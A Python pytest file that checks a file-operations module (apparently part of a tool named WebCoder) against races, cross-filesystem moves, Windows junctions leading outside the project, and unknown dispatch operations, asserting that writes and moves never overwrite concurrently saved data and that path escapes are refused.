def test_a_write_never_replaces_a_version_saved_meanwhile(ops, root, monkeypatch):
    """expected_sha256 is checked, then the new content is written: another program saving the file in between
    must not lose its version."""
    real = fileops.tempfile.mkstemp

    def mkstemp(*args, **kwargs):
        made = real(*args, **kwargs)
        (root / "README.md").write_bytes(b"# saved by the editor meanwhile\n")
        return made
    current = sha((root / "README.md").read_bytes())
    monkeypatch.setattr(fileops.tempfile, "mkstemp", mkstemp)
    for call in (lambda: ops.write_file(str(root), "README.md", "# ours\n", expected_sha256=current),
                 lambda: ops.edit_file(str(root), "README.md", current,
                                       [{"old_string": "# Demo", "new_string": "# Ours"}])):
        (root / "README.md").write_bytes(b"# Demo\n")
        with pytest.raises(WebCoderError) as err:
            call()
        assert code(err) == "SHA_MISMATCH"
        assert (root / "README.md").read_bytes() == b"# saved by the editor meanwhile\n"
    assert not leftovers(root)


def test_moving_to_another_filesystem_never_replaces_either(ops, root, monkeypatch):
    real_rename = fileops.os.rename

    def rename(source, target, *args, **kwargs):  # as if docs/ were another drive mounted in the project
        if os.path.basename(str(source)) in ("README.md", "src"):
            raise OSError(errno.EXDEV, "Invalid cross-device link")
        return real_rename(source, target, *args, **kwargs)
    monkeypatch.setattr(fileops.os, "rename", rename)
    monkeypatch.setattr(fileops.os, "link", lambda *a: (_ for _ in ()).throw(OSError(errno.EXDEV, "cross-device")))
    (root / "docs").mkdir()
    ops.move_path(str(root), "src", "docs/src")  # a folder, copied across
    assert (root / "docs" / "src" / "app.py").exists() and not (root / "src").exists()
    real_copy = fileops.shutil.copy2

    def copy2(source, target, *args, **kwargs):  # another program creates the destination meanwhile
        (root / "docs" / "README.md").write_bytes(b"theirs\n")
        return real_copy(source, target, *args, **kwargs)
    monkeypatch.setattr(fileops.shutil, "copy2", copy2)
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "docs/README.md", sha((root / "README.md").read_bytes()))
    assert code(err) == "DESTINATION_EXISTS" and (root / "docs" / "README.md").read_bytes() == b"theirs\n"
    assert (root / "README.md").read_bytes() == b"# Demo\n" and not leftovers(root)


def test_a_source_changed_while_copied_across_stays(ops, root, monkeypatch):
    """Moving to another filesystem copies, then deletes the original: not when the original changed meanwhile."""
    real_rename = fileops.os.rename

    def rename(source, target, *args, **kwargs):  # as if docs/ were another drive mounted in the project
        if os.path.basename(str(source)) in ("README.md", "src"):
            raise OSError(errno.EXDEV, "Invalid cross-device link")
        return real_rename(source, target, *args, **kwargs)
    monkeypatch.setattr(fileops.os, "rename", rename)
    monkeypatch.setattr(fileops.os, "link", lambda *a: (_ for _ in ()).throw(OSError(errno.EXDEV, "cross-device")))
    (root / "docs").mkdir()
    real_copy, real_copytree = fileops.shutil.copy2, fileops.shutil.copytree

    def copy2(source, target, *args, **kwargs):  # an editor saves the file while it is copied
        done = real_copy(source, target, *args, **kwargs)
        (root / "README.md").write_bytes(b"# saved by the editor meanwhile\n")
        return done

    def copytree(source, target, *args, **kwargs):  # a new file appears in the folder while it is copied
        done = real_copytree(source, target, *args, **kwargs)
        (root / "src" / "new.py").write_bytes(b"print('new')\n")
        return done
    monkeypatch.setattr(fileops.shutil, "copy2", copy2)
    monkeypatch.setattr(fileops.shutil, "copytree", copytree)
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "docs/README.md", sha((root / "README.md").read_bytes()))
    assert code(err) == "SOURCE_CHANGED" and not (root / "docs" / "README.md").exists()
    assert (root / "README.md").read_bytes() == b"# saved by the editor meanwhile\n"
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "src", "docs/src")
    assert code(err) == "SOURCE_CHANGED" and not (root / "docs" / "src").exists()
    assert (root / "src" / "new.py").exists() and (root / "src" / "app.py").exists() and not leftovers(root)


@pytest.mark.skipif(not IS_WINDOWS, reason="junctions are a Windows matter")
def test_a_folder_with_a_junction_is_not_copied_to_another_filesystem(ops, root, tmp_path, monkeypatch):
    """Copied across, a junction would become a plain folder holding what it leads to (outside the project)."""
    import _winapi
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_bytes(b"outside the project\n")
    (root / "pack").mkdir()
    (root / "pack" / "keep.txt").write_bytes(b"kept\n")
    _winapi.CreateJunction(str(outside), str(root / "pack" / "link"))
    real_rename = fileops.os.rename

    def rename(source, target, *args, **kwargs):  # as if docs/ were another drive mounted in the project
        if os.path.basename(str(source)) == "pack":
            raise OSError(errno.EXDEV, "Invalid cross-device link")
        return real_rename(source, target, *args, **kwargs)
    monkeypatch.setattr(fileops.os, "rename", rename)
    (root / "docs").mkdir()
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "pack", "docs/pack")
    assert code(err) == "FOLDER_HAS_JUNCTIONS" and not (root / "docs" / "pack").exists()
    assert (root / "pack" / "keep.txt").exists() and not leftovers(root)
    monkeypatch.setattr(fileops.os, "rename", real_rename)
    ops.move_path(str(root), "pack", "docs/pack")  # within one filesystem the junction itself moves
    moved = root / "docs" / "pack" / "link"
    assert fileops.is_link_or_junction(str(moved)) and (outside / "secret.txt").exists()
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), "docs/pack/link/secret.txt")
    assert code(err) == "PATH_ESCAPE"


def test_a_source_changed_after_the_copy_is_in_place_keeps_both(ops, root, monkeypatch):
    """Once the copy is in place something may use it already: it is not taken back, and the original stays."""
    real_rename, real_publish = fileops.os.rename, fileops.publish_new

    def rename(source, target, *args, **kwargs):  # as if docs/ were another drive mounted in the project
        if os.path.basename(str(source)) in ("README.md", "src"):
            raise OSError(errno.EXDEV, "Invalid cross-device link")
        done = real_rename(source, target, *args, **kwargs)
        if os.path.basename(str(target)) == "src":  # the folder's copy is in place: a file appears in the original
            (root / "src" / "late.py").write_bytes(b"print('late')\n")
        return done

    def publish_new(source, target):  # the file's copy is in place: then an editor saves the original
        real_publish(source, target)
        (root / "README.md").write_bytes(b"# saved right after\n")
    monkeypatch.setattr(fileops.os, "rename", rename)
    monkeypatch.setattr(fileops.os, "link", lambda *a: (_ for _ in ()).throw(OSError(errno.EXDEV, "cross-device")))
    monkeypatch.setattr(fileops, "publish_new", publish_new)
    (root / "docs").mkdir()
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "docs/README.md", sha((root / "README.md").read_bytes()))
    assert code(err) == "SOURCE_CHANGED" and "both were kept" in err.value.message
    assert (root / "docs" / "README.md").read_bytes() == b"# Demo\n"
    assert (root / "README.md").read_bytes() == b"# saved right after\n"
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "src", "docs/src")
    assert code(err) == "SOURCE_CHANGED" and (root / "docs" / "src" / "app.py").exists()
    assert (root / "src" / "late.py").exists() and (root / "src" / "app.py").exists() and not leftovers(root)


def test_a_file_saved_after_its_check_is_not_moved(ops, root, monkeypatch):
    """The sha256 the caller expects was checked; a version saved after that is not what it asked to move."""
    real_hash = fileops.sha256_file

    def sha256_file(path):  # an editor saves the file right after it was hashed
        digest = real_hash(path)
        (root / "README.md").write_bytes(b"# saved by the editor meanwhile\n")
        return digest
    monkeypatch.setattr(fileops, "sha256_file", sha256_file)
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "moved.md", sha((root / "README.md").read_bytes()))
    assert code(err) == "SHA_MISMATCH" and not (root / "moved.md").exists()
    assert (root / "README.md").read_bytes() == b"# saved by the editor meanwhile\n"


@pytest.mark.parametrize("posix", [False, True] if IS_WINDOWS else [True])
def test_a_folder_moved_across_never_replaces_one_created_meanwhile(ops, root, monkeypatch, posix):
    real_rename = fileops.os.rename

    def rename(source, target, *args, **kwargs):  # as if docs/ were another drive mounted in the project
        if os.path.basename(str(source)) == "src":
            raise OSError(errno.EXDEV, "Invalid cross-device link")
        if posix and os.path.isdir(target) and not os.listdir(target):  # POSIX rename() replaces an empty folder
            os.rmdir(target)
        return real_rename(source, target, *args, **kwargs)
    monkeypatch.setattr(fileops.os, "rename", rename)
    monkeypatch.setattr(fileops, "_RENAME_REPLACES", posix)
    (root / "docs").mkdir()
    real_copytree = fileops.shutil.copytree

    def copytree(source, target, *args, **kwargs):  # another program makes the destination folder meanwhile
        (root / "docs" / "src").mkdir()
        return real_copytree(source, target, *args, **kwargs)
    monkeypatch.setattr(fileops.shutil, "copytree", copytree)
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "src", "docs/src")
    assert code(err) == "DESTINATION_EXISTS" and not any((root / "docs" / "src").iterdir())
    assert (root / "src" / "app.py").exists() and not list(root.rglob(".webcoder-*"))
    monkeypatch.setattr(fileops.shutil, "copytree", real_copytree)
    (root / "docs" / "src").rmdir()
    ops.move_path(str(root), "src", "docs/src")  # nothing in the way: it moves
    assert (root / "docs" / "src" / "app.py").exists() and not (root / "src").exists()
    assert not list(root.rglob(".webcoder-*"))


def test_publishing_without_hard_links_is_still_exclusive(tmp_path, monkeypatch):
    monkeypatch.setattr(fileops, "_RENAME_REPLACES", True)

    def no_links(*_args):
        raise OSError(errno.EPERM, "Operation not permitted")
    monkeypatch.setattr(fileops.os, "link", no_links)  # e.g. a FAT drive or a network share
    (tmp_path / "a.tmp").write_bytes(b"ours")
    fileops.publish_new(str(tmp_path / "a.tmp"), str(tmp_path / "a.txt"))
    assert (tmp_path / "a.txt").read_bytes() == b"ours" and not (tmp_path / "a.tmp").exists()
    (tmp_path / "b.tmp").write_bytes(b"ours")
    with pytest.raises(FileExistsError):
        fileops.publish_new(str(tmp_path / "b.tmp"), str(tmp_path / "a.txt"))
    assert (tmp_path / "a.txt").read_bytes() == b"ours" and (tmp_path / "b.tmp").exists()


def test_dispatch_validates_operation_and_arguments(ops, root):
    with pytest.raises(WebCoderError) as err:
        ops.dispatch("fs.format_disk", {})
    assert code(err) == "UNKNOWN_OPERATION"
    with pytest.raises(WebCoderError) as err:
        ops.dispatch("fs.read", {"root": str(root), "path": "README.md", "bogus": 1})
    assert code(err) == "INVALID_ARGUMENT"
    assert ops.dispatch("fs.stat", {"root": str(root), "path": "nope"}) == {"path": "nope", "exists": False}
